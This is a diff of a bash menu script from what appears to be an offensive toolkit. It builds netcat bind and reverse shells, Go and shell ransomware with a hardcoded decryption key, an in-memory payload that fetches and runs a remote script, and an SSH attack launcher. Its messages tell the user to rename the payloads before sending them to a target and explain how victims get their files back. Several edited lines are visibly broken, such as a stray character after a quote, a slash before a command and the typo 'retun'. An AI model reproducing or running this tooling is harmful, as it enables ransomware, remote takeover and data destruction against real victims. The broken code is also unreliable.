@@ -44,6 +44,7 @@ dos_bombs_bin="$bin/unzip_bomb"
 linux_exploit_checker_bin="$bin/linux_exploit_checker"
 ssh_attack_bin="$bin/make_ssh_keys"
 lecb="$bin/lece"
+msf_venom_bin="$bin/msf_payload_creater"y
 # Attempt to source the tab completion script in the bin folder
 source "$bin/tab_complete.cstk"
 # Other bin files not used by the wrapper
@@ -597,7 +598,7 @@ getip() {
         read -r -p "${g}==> ${x}" chosen_ip
 
         # Check if the user chose to enter a custom IP
-        if [[ "$chosen_ip" =~ "[Oo]ther" ]]; then
+        if [[ "$chosen_ip" =~ ^[Oo] ]]; then
             read -r -p "${g}Enter the IP address manually: ${x}" chosen_ip
         fi
 
@@ -829,7 +830,7 @@ netcat_choice() {
 	if [[ "$opt" -eq 1 ]]; then
 		netcat_shells_bind
 	elif [[ "$opt" -eq 2 ]]; then
-        	netcat_shells_reverse
+        netcat_shells_reverse
 	else
 		wait_and_return
 	fi
@@ -853,7 +854,11 @@ netcat_shells_bind() {
     rm -f netcatbindshell.* "$NetcatBindShell" "$ncbo" # remove junk files
     echo -e "$c File \"NetcatBindingShellScript\" is ready and executable in the $Malware folder. \n Change the name of file before sending to target. $x"
     echo -e "Date and Time: $DATE \nUser's Name: $USER \nUser Port $chosen_port \nProgram Used: netcat binding shell create" >> "$log/NetcatBindShell.log" # log the information for user later if needed
-    wait_and_return
+    if [[ "$comeback" = 1 ]]; then
+        break
+    else
+        wait_and_return
+    fi
 }
 
 # Class: PAYLOADS - Tool: Netcat Reverse Shell - Option 1-B
@@ -870,11 +875,16 @@ netcat_shells_reverse() {
     echo '#!/bin/bash'  > netcatreverseshell.temp3 # create new file with bin bash as first line
     cat netcatreverseshell.temp2 >> netcatreverseshell.temp3 # append the encrypted script to file
     chmod 770 netcatreverseshell.temp3
-    shc -r -f netcatreverseshell.temp3 -o "$Malware"/NetcatReverseShellScript # compile script
+ /    shc -r -f netcatreverseshell.temp3 -o "$Malware"/NetcatReverseShellScript # compile script
     rm -f netcatreverseshell.* "$ncro" "$NetcatRevShell" # remove junk files
     echo -e "$c File \"NetcatReverseShellScript\" is ready and executable in the $Malware folder. \nChange the name of file before sending to target. $x"
     echo -e "Date and Time: $DATE \nUser's Name: $USER \nUser IP used: $chosen_ip \nUser Port $chosen_port \nNetcat Reverse shell create" >> "$log/NetcatReverseShell.log"
-    wait_and_return
+    if [[ "$comeback" = 1 ]]; then
+        break
+    else
+        wait_and_return
+    fi
+
 }
 
 # Class: PAYLOADS - Tools: Linux Back door Creator - Option 2
@@ -979,12 +989,12 @@ ransomware_in_go() {
     done
     openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$rwg" -out "$rwgo" -pass pass:"$pswd" &>/dev/null
     openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$rdg" -out "$rdgo" -pass pass:"$pswd" &>/dev/null
-    base32hex -d "$rwgo" | base64 --wrap 16 -d | base32plain -d > "$RansomEncryptGo" 
-    base32hex -d "$rdgo" | base64 --wrap 16 -d | base32plain -d > "$RansomDecryptGo" 
-    pushd "$lib" &>/dev/null
-    env GOOS="$system" GOARCH="$arch" go build "$RansomEncryptGo" 
-    env GOOS="$system" GOARCH="$arch" go build "$RansomDecryptGo" 
-    rm -f "$rwgo" "$rdgo" "$RansomEncryptGo" "$RansomDecryptGo" 
+    base32hex -d "$rwgo" | base64 --wrap 16 -d | base32plain -d > "$RansomEncryptGo"
+    base32hex -d "$rdgo" | base64 --wrap 16 -d | base32plain -d > "$RansomDecryptGo"
+    pushd "$lib" &>/dev/null || return
+    env GOOS="$system" GOARCH="$arch" go build "$RansomEncryptGo"
+    env GOOS="$system" GOARCH="$arch" go build "$RansomDecryptGo"
+    rm -f "$rwgo" "$rdgo" "$RansomEncryptGo" "$RansomDecryptGo"
     if [[ "$system" = "windows" ]]; then
         mv "$RansomwareEGoW" "$Malware/$encfilename.exe"
         mv "$RansomwareDGoW" "$Malware/$decfilename.exe"
@@ -992,7 +1002,7 @@ ransomware_in_go() {
         mv "$RansomwareEGo" "$Malware/$encfilename"
         mv "$RansomwareDGo" "$Malware/$decfilename"
     fi
-    popd &>/dev/null
+    popd &>/dev/null || retun
     echo "K5R0z4Js58vpNzSq4nixjQt2av8FcIvb" > "$Malware/$decfilename.key"
     echo -e "${g} \nThe encrypt and decrypt scripts are available in the ${r} $Malware ${g} folder if they are for a windows computer there will be a ${y} .exe extension ${x}"
     echo -e "${b} \nTo run the encryption script the target needs to run this command in there terminal: ${r} go run $encfilename ${x} (Linux,MacOS,FreeBSD,WebAssembly) - ${r} go run $encfilename.exe ${x} (Windows)"
@@ -1000,7 +1010,11 @@ ransomware_in_go() {
     echo -e "${c} \nWhen target tries to decrypt there files they will be asked for a ${r} secret key ${c} the key they need is:==>  ${r} K5R0z4Js58vpNzSq4nixjQt2av8FcIvb ${c} <== ${x}"
     echo -e "${y} \nBecause they need a secret key to decrypt there files you are fine to send both files at the same time, the key ${r} is not readable. ${x}"
     echo -e "${g} \nA copy of the key is also in the ${r} $Malware ${g} folder named ${r} $decfilename.key ${x}"
-    wait_and_return   
+    if [[ "$comeback" = 1 ]]; then
+        break
+    else
+        wait_and_return
+    fi
  }
 
 # Class: PAYLOADS - Tool: Ransomware encrypt/decrypt script - Option 3
@@ -1044,8 +1058,11 @@ ransomware_quick_dirty() {
 	rm -rf ransom_encrypt_remote.* ransom_decrypt_remote.*
 	echo -e "\n\n $c File ransom_quick_and_dirty and ransom_nice_and_clean are ready and executable in the $Malware folder. \nransom_quick-dirty.sh is the encrypting script. \nransomnice_clean is the decrypting script. $x"
 	echo -e "\n\nDate: $DATE \nUser: $USER \nPassword used for key encryption: $PASSWORD1 \nEmail used for victim respond back: $EMAIL" >> "$log/ransom_quick_dirty.log" "$log/ransom_nice_clean.log"
-
-	wait_and_return
+    if [[ "$comeback" = 1 ]]; then
+        break
+    else
+        wait_and_return
+    fi
 }
 
 # Class:PAYLOADS - Tool:Multi reverse shell option script - Option 4 (wrapper used)
@@ -1094,7 +1111,11 @@ no_touch_script() {
 	rm -rf no_touch_disk.*
 	echo -e "\n\n $p File no_touch_disk_payload is available in the $Malware folder, change name and make executable before sending to target. $x \n"
 	echo -e "\n Date: $DATE \nUser: $USER \n Program used: in memory payload \n Target script to grab and run: $HTTP://$HOST/$SCRIPT " >> "$log/no-touch-payload"
-	wait_and_return
+    if [[ "$comeback" = 1 ]]; then
+        break
+    else
+        wait_and_return
+    fi
 }
 
 # Class: PAYLOADS - Tool: destroy this computer - Option 6
@@ -1140,7 +1161,11 @@ ssh_attack() {
     sleep 3
     export CSTK_MAIN_RUNNER=1
     "$cstk_wrapper" "$ssh_attack_bin"
-    wait_and_return
+    if [[ "$comeback" = 1 ]]; then
+        break
+    else
+        wait_and_return
+    fi
 }
 
 ################################# POST EXPLOIT TOOLS ###############################
